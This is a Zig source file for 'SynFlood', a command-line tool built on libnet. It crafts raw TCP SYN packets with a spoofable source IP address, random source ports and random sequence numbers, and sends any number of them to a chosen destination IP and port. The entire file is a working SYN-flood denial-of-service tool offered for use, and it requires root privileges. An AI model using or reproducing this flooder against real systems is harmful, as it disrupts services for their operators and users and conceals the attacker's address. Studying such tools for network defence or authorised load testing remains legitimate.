const VERSION = "3.2.0-dev.2";
const c = @import("c");
const std = @import("std");
const File = std.Io.File;
const Writer = std.Io.Writer;
const eql = std.mem.eql;
const copyf = std.mem.copyForwards;
const zeroes = std.mem.zeroes;
const parseInt = std.fmt.parseInt;

pub fn main(init: std.process.Init) !u8 {
    const minimal = init.minimal;
    const allocator = init.arena.allocator();

    const args = try minimal.args.toSlice(allocator);
    var args_iter = minimal.args.iterate();
    defer args_iter.deinit();
    _ = args_iter.next();

    const stdout_buffer = try allocator.alloc(u8, 1024);
    defer allocator.free(stdout_buffer);
    var stdout_writer = File.stdout().writer(init.io, stdout_buffer);
    const stdout = &stdout_writer.interface;

    const stderr_buffer = try allocator.alloc(u8, 1024);
    defer allocator.free(stderr_buffer);
    var stderr_writer = File.stderr().writer(init.io, stderr_buffer);
    const stderr = &stderr_writer.interface;

    try stdout.print("SynFlood " ++ VERSION ++ "\n", .{});
    try stdout.print("Copyright (C) 2010 Christian Mayer <https://fox21.at>\n", .{});
    try stdout.print("{s}\n", .{c.libnet_version()});
    try stdout.flush();

    if (args.len == 1) {
        try printHelp(stdout);
        return 1;
    }

    var source_ip: [16]u8 = zeroes([16]u8);
    var source_ip_s: []u8 = undefined;
    var destination_ip: [16]u8 = zeroes([16]u8);
    var destination_ip_s: []u8 = undefined;
    var destination_port: u16 = 0;
    var connections: usize = 1;
    var verbose: u8 = 0;
    while (args_iter.next()) |arg| {
        if (eql(u8, arg, "-h") or eql(u8, arg, "--help")) {
            try printHelp(stdout);
            return 1;
        } else if (eql(u8, arg, "-s")) {
            if (args_iter.next()) |next| {
                copyf(u8, &source_ip, next);
                source_ip_s = source_ip[0..next.len];
            }
        } else if (eql(u8, arg, "-d")) {
            if (args_iter.next()) |next| {
                copyf(u8, &destination_ip, next);
                destination_ip_s = destination_ip[0..next.len];
            }
        } else if (eql(u8, arg, "-p")) {
            if (args_iter.next()) |next| {
                destination_port = try parseInt(u16, next, 10);
            }
        } else if (eql(u8, arg, "-c")) {
            if (args_iter.next()) |next| {
                connections = try parseInt(usize, next, 10);
            }
        } else if (eql(u8, arg, "-v") or eql(u8, arg, "--verbose")) {
            verbose += 1;
        }
    }

    if (std.c.getuid() != 0) {
        try stderr.print("ERROR: You are not root, script kiddie.\n", .{});
        try stderr.flush();
        return 2;
    }

    try stdout.print("source ip: {s}\n", .{source_ip_s});
    try stdout.print("destination ip: {s}\n", .{destination_ip_s});
    try stdout.print("destination port: {d}\n", .{destination_port});
    try stdout.print("connections: {d}\n", .{connections});
    try stdout.print("verbose: {d}\n", .{verbose});
    try stdout.flush();

    var errbuf: [c.LIBNET_ERRBUF_SIZE]u8 = undefined;
    const net = c.libnet_init(c.LIBNET_RAW4, null, &errbuf[0]);
    if (net == null) {
        try stderr.print("ERROR libnet_init: {s}\n", .{errbuf});
        try stderr.flush();
        return 3;
    }

    const src_ip = c.libnet_name2addr4(net, source_ip_s.ptr, c.LIBNET_RESOLVE);
    const dest_ip = c.libnet_name2addr4(net, destination_ip_s.ptr, c.LIBNET_RESOLVE);
    var tcp: c.libnet_ptag_t = 0;
    var ipv4: c.libnet_ptag_t = 0;
    var sock_written: c_int = 0;

    for (0..connections) |conn_id| {
        if (verbose >= 1) {
            try stdout.print("[ ] connection: {d} ...", .{conn_id});
            try stdout.flush();
        }

        const src_port: u16 = @intCast(c.libnet_get_prand(c.LIBNET_PRu16));
        const src_seq = c.libnet_get_prand(c.LIBNET_PRu16);

        tcp = c.libnet_build_tcp(src_port, // src port
            destination_port, // dst port
            src_seq, // seq
            0, // ack
            c.TH_SYN, // control
            65535, // window
            0, // checksum
            0, // urgent
            c.LIBNET_TCP_H, // header len
            null, // payload
            0, // payload size
            net, tcp // ptag
        );
        if (tcp == -1) {
            try stderr.print("\nERROR libnet_build_tcp: {s}\n", .{c.libnet_geterror(net)});
            try stderr.flush();
            break;
        }

        const ip_id: u16 = @intCast(c.libnet_get_prand(c.LIBNET_PRu16));
        ipv4 = c.libnet_build_ipv4(c.LIBNET_IPV4_H + c.LIBNET_TCP_H, // len
            0, // tos
            ip_id, // ip id
            c.IP_DF, // frag
            64, // ttl
            c.IPPROTO_TCP, // upper layer protocol
            0, // checksum
            src_ip, // src ip
            dest_ip, // dst ip
            null, // payload
            0, // payload size
            net, ipv4);
        if (ipv4 == -1) {
            try stderr.print("\nERROR libnet_build_ipv4: {s}\n", .{c.libnet_geterror(net)});
            try stderr.flush();
            break;
        }

        sock_written = c.libnet_write(net);
        if (sock_written == -1) {
            try stderr.print("\nERROR libnet_write: {s}\n", .{c.libnet_geterror(net)});
            try stderr.flush();
            break;
        }
        if (verbose >= 1) {
            try stdout.print("\r[+] connection: {d}, socket written: {d}\n", .{ conn_id, sock_written });
            try stdout.flush();
        }
    }

    return 0;
}

fn printHelp(stdout: *Writer) !void {
    const help =
        \\Usage: synflood [-h|--help] -s <IP> -d <IP> -p <PORT> [-c <NUM>]
        \\
        \\Options:
        \\-h, --help         Print this help.
        \\-s <IP>            Source IP-address.
        \\-d <IP>            Destination IP-address.
        \\-p <PORT>          Destination port.
        \\-c <NUM>           Number of connections.
        \\-v, --verbose      Verbose output.
    ;
    try stdout.print(help ++ "\n", .{});
    try stdout.flush();
}
